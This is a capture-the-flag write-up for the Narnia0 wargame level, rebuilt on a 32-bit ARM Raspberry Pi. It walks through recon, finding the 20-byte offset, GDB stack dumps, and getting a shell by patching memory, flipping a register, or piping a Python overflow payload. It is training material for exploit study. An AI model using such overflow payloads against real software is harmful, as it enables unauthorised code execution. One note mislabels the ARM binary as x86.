

> [! Note]
> These binaries are compiled on a local environment with vulnerable functions and it is intended to train and learn, the setup may vary from the actual binaries located at narnia.labs.overthewire.org

## Narnia0

### Basic Recon

```bash
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ file narnia0_32
narnia0_32: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, BuildID[sha1]=2ac1920d30ece35abea2f62d095e53930c0e3278, for GNU/Linux 3.2.0, not stripped

user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ readelf -h narnia0_32
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2\'s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           ARM
  Version:                           0x1
  Entry point address:               0x103f9
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4752 (bytes into file)
  Flags:                             0x5000400, Version5 EABI, hard-float ABI
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 29
  
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ pwn checksec narnia0_32
[*] '/home/user/Desktop/raspberrypi5/32Bit/narnia0_32'
    Arch:       arm-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x10000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
   
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ ./narnia0_32
Correct val\'s value from 0x41414141 -> 0xdeadbeef!
Here is your chance: abcdabcdabcdabcd
buf: abcdabcdabcdabcd
val: 0x41414141
WAY OFF!!!!
```

* Basic information from the recon; application is a `32 bit; ARM` binary and is `not stripped`
* Entry point is also identified from the `readelf -h` output `0x103f9`
* The application has no protections, which can be seen from the `pwn checksec` output
* A sample execution can also been seen

### Offset Identification

```bash
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ pwn cyclic 100 | ./narnia0_32
Correct val\'s value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaabaaacaaadaaaeaaafaaa
val: 0x61616166
WAY OFF!!!!
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ pwn cyclic -o 100 -l 0x61616166
20 # <-- It takes 20 characters to fill the buffer and over write the lookedup variable
```

>[! Note]
> x86 - 32 Bit ; LE (Little Endian) from `readelf -h` output; 

![[Pasted image 20251204230446.png]]

* Decompiled code from binary; function name `entry`

![[Pasted image 20251204230718.png]]

* Type conversion from ghidra, conditional check
![[Pasted image 20251204231027.png]]

* Reads `24` characters of string format; `scanf()`
![[Pasted image 20251204231654.png]]
* So the buffer size is confirmed from both `pwn checksec` and `ghidra` analysis

### Debugging

```js
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ gdbserver :1234 ./narnia0_32
Process ./narnia0_32 created; pid = 3189
Listening on port 1234
Remote debugging from host ::ffff:192.168.1.16, port 64157
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
➜  32Bit gdb
# <SNIP>
(No debugging symbols found in target:/lib/ld-linux-armhf.so.3)
PC: => 0xf7fc1bcc:      ldr     r10, [pc, #56]  @ 0xf7fc1c0c
================================================
     ========== REGISTERS ==========
================================================

r3: 0x00000000
r4: 0x00000000
r5: 0x00000000
r6: 0x00000000
r7: 0x00000000
r8: 0x00000000
r9: 0x00000000
r10: 0x00000000
r11: 0x00000000
r12: 0x00000000
r13/sp: 0xfffef4b0
r14/lr: 0x00000000
r15/pc: 0xf7fc1bcc
================================================
 ================== STACK ==================
================================================

0xfffef4b0:     0x00000001      0xfffef5ef      0x00000000      0xfffef5fc
0xfffef4c0:     0xfffef60c      0xfffef61b      0xfffef645      0xfffef652
0xfffef4d0:     0xfffef667      0xfffef67c      0xfffef68b      0xfffef69b
0xfffef4e0:     0xfffef6ac      0xfffefe29      0xfffefe5a      0xfffefe71
0xfffef4f0:     0xfffefe7c      0xfffefe86      0xfffefe8e      0xfffefea0
0xfffef500:     0xfffefebf      0xfffefee0      0xfffeff3e      0xfffeff74
0xfffef510:     0xfffeff87      0xfffeffae      0x00000000      0x00000010
0xfffef520:     0x01f7b0d6      0x00000006      0x00004000      0x00000011
0xfffef530:     0x00000064      0x00000003      0x00010034      0x00000004
0xfffef540:     0x00000020      0x00000005      0x00000009      0x00000007
0xf7fc1bcc in ?? () from target:/lib/ld-linux-armhf.so.3

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x00010378  _init
0x00010398  __libc_start_main@plt
0x000103a4  printf@plt
0x000103b0  puts@plt
0x000103bc  system@plt
0x000103c8  __gmon_start__@plt
0x000103d4  exit@plt
0x000103e0  __isoc99_scanf@plt
0x000103ec  abort@plt
0x000103f8  _start                           # <--- START FUNCTION
0x0001042c  call_weak_fn
0x00010450  deregister_tm_clones
0x00010474  register_tm_clones
0x000104a0  __do_global_dtors_aux
0x000104b8  frame_dummy
0x000104bc  main                            # <--- MAIN FUNCTION
0x00010554  _fini
0xf7facc40  _dl_signal_exception
0xf7faccb0  _dl_signal_error
0xf7facf5c  _dl_catch_exception
0xf7fae324  _dl_debug_state
0xf7faf388  _dl_exception_create
0xf7faf458  _dl_exception_create_format
0xf7faf7bc  _dl_exception_free
0xf7fb3ee8  _dl_rtld_di_serinfo
0xf7fb6ba4  _dl_find_dso_for_object
0xf7fb82c0  _dl_fatal_printf
0xf7fbb6c8  _dl_get_tls_static_info
0xf7fbb7f0  _dl_allocate_tls_init
0xf7fbbab0  _dl_allocate_tls
0xf7fbbadc  _dl_deallocate_tls
0xf7fbbdf0  __tls_get_addr
0xf7fbc788  __tunable_is_initialized
0xf7fbce44  __tunable_get_val
0xf7fbeb50  _dl_audit_preinit
0xf7fbebd0  _dl_audit_symbind_alt
0xf7fc0fa4  _dl_mcount
0xf7fcc154  __rtld_version_placeholder

(gdb) info proc mappings
process 3189
Mapped address spaces:

Start Addr End Addr   Size       Offset     Perms File
0x00010000 0x00014000 0x4000     0x0        r-xp  /home/user/Desktop/raspberrypi5/32Bit/narnia0_32.       # <--- Application execution memory locations
0x00020000 0x00024000 0x4000     0x0        rw-p  /home/user/Desktop/raspberrypi5/32Bit/narnia0_32
0xf7fac000 0xf7fd4000 0x28000    0x0        r-xp  /usr/lib/arm-linux-gnueabihf/ld-linux-armhf.so.3
0xf7fe4000 0xf7fe8000 0x4000     0x0        r-xp  [sigpage]
0xf7fe8000 0xf7ff0000 0x8000     0x2c000    rw-p  /usr/lib/arm-linux-gnueabihf/ld-linux-armhf.so.3
0xfffcc000 0xffff0000 0x24000    0x0        rwxp  [stack]
0xffff0000 0xffff4000 0x4000     0x0        r-xp  [vectors]

(gdb) break * main
Breakpoint 1 at 0x104bc
(gdb) c
Continuing.
Reading /lib/arm-linux-gnueabihf/libc.so.6 from remote target...
PC: => 0x104bc <main>:  push    {r7, lr}
================================================
     ========== REGISTERS ==========
================================================

r3: 0x000104bd
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xf7fec000................................................................................................ r7 value
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef340
r14/lr: 0xf7e0f6d8............................................................................................. lr value
r15/pc: 0x000104bc
================================================
 ================== STACK ==================
================================================

0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94
0xfffef3c0:     0x00000001      0xf7fed128      0x00000001      0x00000000
0xfffef3d0:     0x00000001      0xf7feca28      0xfffef404      0xf7feca28

Breakpoint 1, 0x000104bc in main ()
(gdb) ni
PC: => 0x104be <main+2>:        sub     sp, #24
================================================
     ========== REGISTERS ==========
================================================

r3: 0x000104bd
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xf7fec000
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef338
r14/lr: 0xf7e0f6d8
r15/pc: 0x000104be
================================================
 ================== STACK ==================
================================================

0xfffef338:     0xf7fec000      0xf7e0f6d8      0xf7f7fe44      0x000104bd................................. Value of r7 and lr pushed on to the stack
0xfffef348:     0x00000001      0xfffef4b4      0x99d7495b      0x91c94c8f
0xfffef358:     0xfffef4b4      0x00000001      0x000207a8      0xf7fec000
0xfffef368:     0x000104bd      0xf7febce0      0x00000000      0x000207a8
0xfffef378:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef388:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef398:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a8:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b8:     0xfffef408      0xf7fecb94      0x00000001      0xf7fed128
0xfffef3c8:     0x00000001      0x00000000      0x00000001      0xf7feca28
0x000104be in main ()
(gdb) ni
PC: => 0x104c0 <main+4>:        add     r7, sp, #0......................................................... adds 0x0 with value in sp and stores in r7
================================================
     ========== REGISTERS ==========
================================================

r3: 0x000104bd
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xf7fec000
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef320
r14/lr: 0xf7e0f6d8
r15/pc: 0x000104c0
================================================
 ================== STACK ==================
================================================

0xfffef320:     0xf7fece18      0xf63d4e2e      0xf7df5360      0xf7df3e1c
0xfffef330:     0xf7df2124      0xf7fb456c      0xf7fec000      0xf7e0f6d8
0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94
0x000104c0 in main ()
(gdb) ni
PC: => 0x104c2 <main+6>:        mov.w   r3, #1094795585 @ 0x41414141
================================================
     ========== REGISTERS ==========
================================================

r3: 0x000104bd
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xfffef320............................................................................................. Result of 0xfffef320 + 0x0
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef320
r14/lr: 0xf7e0f6d8
r15/pc: 0x000104c2
================================================
 ================== STACK ==================
================================================

0xfffef320:     0xf7fece18      0xf63d4e2e      0xf7df5360      0xf7df3e1c
0xfffef330:     0xf7df2124      0xf7fb456c      0xf7fec000      0xf7e0f6d8
0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94
0x000104c2 in main ()
(gdb) ni
PC: => 0x104c6 <main+10>:       str     r3, [r7, #20]..................... stores value on r3 to a location pointed by r7 + 0x14 ; python3 -c 'print(hex(20))'
================================================
     ========== REGISTERS ==========
================================================

r3: 0x41414141.......................................................................................... immediate value stored on r3
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xfffef320
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef320
r14/lr: 0xf7e0f6d8
r15/pc: 0x000104c6
================================================
 ================== STACK ==================
================================================

0xfffef320:     0xf7fece18      0xf63d4e2e      0xf7df5360      0xf7df3e1c
0xfffef330:     0xf7df2124      0xf7fb456c      0xf7fec000      0xf7e0f6d8
0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94
0x000104c6 in main ()
(gdb) ni
PC: => 0x104c8 <main+12>:       ldr     r3, [pc, #108]  @ (0x10538 <main+124>)
================================================
     ========== REGISTERS ==========
================================================

r3: 0x41414141
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xfffef320
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef320
r14/lr: 0xf7e0f6d8
r15/pc: 0x000104c8
================================================
 ================== STACK ==================
================================================

// address:      0-3 bytes       4-7 bytes      8-11 bytes      12-15 bytes
// xxxx320:     xxx320-323      xxx324-327      xxx328-32b      xxx32c-32f
0xfffef320:     0xf7fece18      0xf63d4e2e      0xf7df5360      0xf7df3e1c
0xfffef330:     0xf7df2124      0x41414141      0xf7fec000      0xf7e0f6d8 ......... value of r3 stored on 0xfffef334; python3 -c 'print(hex(0xfffef320+0x14))'
0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94
0x000104c8 in main ()
(gdb) ni
PC: => 0x104ca <main+14>:       add     r3, pc
================================================
     ========== REGISTERS ==========
================================================

r3: 0x00000122
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xfffef320
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0xf7f7fe44
r13/sp: 0xfffef320
r14/lr: 0xf7e0f6d8
r15/pc: 0x000104ca
================================================
 ================== STACK ==================
================================================

0xfffef320:     0xf7fece18      0xf63d4e2e      0xf7df5360      0xf7df3e1c
0xfffef330:     0xf7df2124      0x41414141      0xf7fec000      0xf7e0f6d8
0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94
0x000104ca in main ()
(gdb)
(gdb) x/i 0x000104cc
   0x104cc <main+16>:   mov     r0, r3................................................... value of r3 moved to r0
(gdb)
(gdb) break * 0x000104d8
Breakpoint 2 at 0x104d8
(gdb) c
Continuing.
PC: => 0x104d8 <main+28>:       blx     0x103a4 <printf@plt>.............................. printf() is called; the value to pass to the function is stored on r0
================================================
     ========== REGISTERS ==========
================================================

r3: 0x00010624
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xfffef320
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0x00000033
r13/sp: 0xfffef320
r14/lr: 0x00000001
r15/pc: 0x000104d8
================================================
 ================== STACK ==================
================================================

0xfffef320:     0xf7fece18      0xf63d4e2e      0xf7df5360      0xf7df3e1c
0xfffef330:     0xf7df2124      0x41414141      0xf7fec000      0xf7e0f6d8
0xfffef340:     0xf7f7fe44      0x000104bd      0x00000001      0xfffef4b4
0xfffef350:     0x99d7495b      0x91c94c8f      0xfffef4b4      0x00000001
0xfffef360:     0x000207a8      0xf7fec000      0x000104bd      0xf7febce0
0xfffef370:     0x00000000      0x000207a8      0x00000000      0x00000000
0xfffef380:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef390:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffef3b0:     0x00000000      0x00000000      0xfffef408      0xf7fecb94

Breakpoint 2, 0x000104d8 in main ()
(gdb) x/s $r0
0x10624:        "Here is your chance: "
(gdb) x/s $r3
0x10624:        "Here is your chance: "
(gdb)

(gdb) break * 0x000104ea
Breakpoint 1 at 0x104ea
(gdb) c
Continuing.
Reading /lib/arm-linux-gnueabihf/libc.so.6 from remote target...
PC: => 0x104ea <main+46>:	mov	r3, r7
================================================
     ========== REGISTERS ==========
================================================

r3: 0x00000000
r4: 0xfffef4b4
r5: 0x00000001
r6: 0x000207a8
r7: 0xfffef320
r8: 0x000104bd
r9: 0xf7febce0
r10: 0x00000000
r11: 0x000207a8
r12: 0x0000000a
r13/sp: 0xfffef320
r14/lr: 0x000104eb
r15/pc: 0x000104ea
================================================
 ================== STACK ==================
================================================

0xfffef320:	0x41414141	0x42424242	0x43434343	0x44444444
0xfffef330:	0x45454545	0x41414100	0xf7fec000	0xf7e0f6d8 ............ We can see the previously stored value 0x41414141 is modified to 0x41414100 (becasue of overflow)
0xfffef340:	0xf7f7fe44	0x000104bd	0x00000001	0xfffef4b4
0xfffef350:	0x3f1cdfa0	0x3702da74	0xfffef4b4	0x00000001
0xfffef360:	0x000207a8	0xf7fec000	0x000104bd	0xf7febce0
0xfffef370:	0x00000000	0x000207a8	0x00000000	0x00000000
0xfffef380:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef390:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3b0:	0x00000000	0x00000000	0xfffef408	0xf7fecb94

Breakpoint 1, 0x000104ea in main ()
```

* The start address which we observed from the `readelf -h`'s output: `  Entry point address:               0x103f9`; can be seen in the `_start` function has the memory address of `0x103f8`

```bash
# output from the rasppi
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ gdbserver :1234 ./narnia0_32
Process ./narnia0_32 created; pid = 3485
Listening on port 1234
Remote debugging from host ::ffff:192.168.1.16, port 49544
Correct val\'s value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAABBBBCCCCDDDDEEEE
buf: AAAABBBBCCCCDDDDEEEE
val: 0x41414100#............................................................ overflown value
WAY OFF!!!!

Child exited with status 1
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$
```
- Lets play with endianess now
![[Pasted image 20251205013233.png]]
- Even though we have given `0xdeadbeef` as input it is interpreted by the binary as `edx0` which is reverse of `de` from deadbeef
- This is an *EXPECTED* behaviour as the binary is LSB (little endian); we have to provide the input as `\xef\xbe\xad\xde` 
- Now we get an different error, even though we have provided the input in the binary expected little endian format
```bash
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ gdbserver :1234 ./narnia0_32
Process ./narnia0_32 created; pid = 3503
Listening on port 1234
Remote debugging from host ::ffff:192.168.1.16, port 49754
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaxefxbexadxde
buf: aaaaaaaaaaaaaaaaaaaaxefx
val: 0x78666578
WAY OFF!!!!

Child exited with status 1
user@rapberrypi:~/Desktop/raspberrypi5/32Bit$
```
- Here comes the play of strings and bytes
	- Now we have the following ways
		- Edit the value in the memory address
		- Bypass the conditional checks from assembly
		- provide a byte string generated by python to the application

### Exploitation

#### Edit the value in the memory address
* Hit the break point
* Update the value of the stack with `set {<type>}<address> = <value>`
* The updated stack address looks like the following below
```bash
================================================
 ================== STACK ==================
================================================

0xfffef320:	0x61616161	0xf63d0061	0xf7df5360	0xf7df3e1c
0xfffef330:	0xf7df2124	0x41414141	0xf7fec000	0xf7e0f6d8#.............................location of 0x41414141
0xfffef340:	0xf7f7fe44	0x000104bd	0x00000001	0xfffef4b4
0xfffef350:	0xeb544808	0xe34a4ddc	0xfffef4b4	0x00000001
0xfffef360:	0x000207a8	0xf7fec000	0x000104bd	0xf7febce0
0xfffef370:	0x00000000	0x000207a8	0x00000000	0x00000000
0xfffef380:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef390:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3b0:	0x00000000	0x00000000	0xfffef408	0xf7fecb94

Breakpoint 1, 0x000104ea in main ()
(gdb) set {int}0xfffef334 = 0xdeadbeef
(gdb) x/40w $sp
0xfffef320:	0x61616161	0xf63d0061	0xf7df5360	0xf7df3e1c
0xfffef330:	0xf7df2124	0xdeadbeef	0xf7fec000	0xf7e0f6d8#.............................Updated from 0x41414141 to 0xdeadbeef
0xfffef340:	0xf7f7fe44	0x000104bd	0x00000001	0xfffef4b4
0xfffef350:	0xeb544808	0xe34a4ddc	0xfffef4b4	0x00000001
0xfffef360:	0x000207a8	0xf7fec000	0x000104bd	0xf7febce0
0xfffef370:	0x00000000	0x000207a8	0x00000000	0x00000000
0xfffef380:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef390:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3b0:	0x00000000	0x00000000	0xfffef408	0xf7fecb94
(gdb) c
Continuing.
```
- We got a shell
![[Pasted image 20251205014528.png]]
#### Bypass the conditional check
- Disassemble the `main` function
- break at the comparison
- alter the values of the register
- continue the exection
```js
(gdb) disass main
Dump of assembler code for function main:
// SNIP
   0x0001058a <+74>:	movw	r3, #48879	@ 0xbeef
   0x0001058e <+78>:	movt	r3, #57005	@ 0xdead
   0x00010592 <+82>:	cmp	r2, r3 .............................................. main comparison before spawning a shell with system() / exiting the function
   0x00010594 <+84>:	bne.n	0x105b6 <main+118>
   0x00010596 <+86>:	blx	0x1041c <geteuid@plt>
   0x0001059a <+90>:	mov	r4, r0
   0x0001059c <+92>:	blx	0x1041c <geteuid@plt>
   0x000105a0 <+96>:	mov	r3, r0
   0x000105a2 <+98>:	mov	r1, r3
   0x000105a4 <+100>:	mov	r0, r4
   0x000105a6 <+102>:	blx	0x10464 <setreuid@plt>
   0x000105aa <+106>:	ldr	r3, [pc, #56]	@ (0x105e4 <main+164>)
   0x000105ac <+108>:	add	r3, pc
   0x000105ae <+110>:	mov	r0, r3
   0x000105b0 <+112>:	blx	0x10440 <system@plt>
// SNIP
   0x000105e8 <+168>:	andeq	r0, r0, r4, asr #2
End of assembler dump.
(gdb) break * 0x00010592
Note: breakpoint 4 also set at pc 0x10592.
Breakpoint 5 at 0x10592: file narnia0.c, line 18.
(gdb) c
Continuing.
Reading /lib/arm-linux-gnueabihf/libc.so.6 from remote target...
PC: => 0x10592 <main+82>:	cmp	r2, r3
================================================
     ========== REGISTERS ==========
================================================

r3: 0xdeadbeef
r4: 0xfffef4e4
r5: 0x00000001
r6: 0x0002ff14
r7: 0xfffef348
r8: 0x00010541
r9: 0xf7febce0
r10: 0x00000000
r11: 0x0002ff14
r12: 0xfffef27c
r13/sp: 0xfffef348
r14/lr: 0x00010589
r15/pc: 0x00010592
================================================
 ================== STACK ==================
================================================

0xfffef348:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffef358:	0x62616161	0x62626262	0xf7df2100	0xfffef4e4
0xfffef368:	0xf7fec000	0xf7e0f6d8	0xf7f7fe44	0x00010541
0xfffef378:	0x00000001	0xfffef4e4	0x0206ef12	0x0a18eaf6
0xfffef388:	0xfffef4e4	0x00000001	0x0002ff14	0xf7fec000
0xfffef398:	0x00010541	0xf7febce0	0x00000000	0x0002ff14
0xfffef3a8:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3b8:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3c8:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffef3d8:	0x00000000	0x00000000	0x00000000	0x00000000

Breakpoint 4, 0x00010592 in main () at narnia0.c:18
18	in narnia0.c
(gdb) set $r2=0xdeadbeef............................................................ manually changed the value of the r2 register
(gdb) info registers
r0             0x10                16
r1             0x0                 0
r2             0xdeadbeef          3735928559
r3             0xdeadbeef          3735928559
r4             0xfffef4e4          4294898916
r5             0x1                 1
r6             0x2ff14             196372
r7             0xfffef348          4294898504
r8             0x10541             66881
r9             0xf7febce0          4160666848
r10            0x0                 0
r11            0x2ff14             196372
r12            0xfffef27c          4294898300
sp             0xfffef348          0xfffef348
lr             0x10589             66953
pc             0x10592             0x10592 <main+82>
cpsr           0x60000030          1610612784
fpscr          0x0                 0
(gdb) c
Continuing.
```
- We got a shell
![[Pasted image 20251205015659.png]]
#### Passing bytes to program via python

>[! Note]
> Most of the writeups uses `python -c 'print "A"*20 + <deadbeef>'` this will not work with python3 
> Python2 used to handle everything as bytes; but python3 handles everything as strings unless specified explicitly 

- Below is a comparison and solution for the challange
```bash
# printing via normal print does not yeild the value and necessary value - ouptut type - str
user@rapberrypi:~/Desktop/narnia $ python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")' | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 afc3 bec2 adc2 9ec3 000a     
000001d
user@rapberrypi:~/Desktop/narnia $ python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")' |  ./narnia0 
Correct val\'s value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAï¾
val: 0xbec2afc3
WAY OFF!!!!

# printing the values with bytes and buffer format
# used sys.stdout.buffer.write() instead of print  - output type - bytes
user@rapberrypi:~/Desktop/narnia $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20+b"\xef\xbe\xad\xde")' | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 beef dead                     #...............................deadbeef has beed formed
0000018
user@rapberrypi:~/Desktop/narnia $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20+b"\xef\xbe\xad\xde")' | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
val: 0xdeadbeef
```

>[! Note]
>Additional quick win from pwntools; `sudo apt-get install python3-pwntools / pip install pwntools`
>```bash
>user@rapberrypi:~/Desktop/narnia $ python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> print(b'a'*20 + p32(0xdeadbeef))
b'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde'
>>> ```

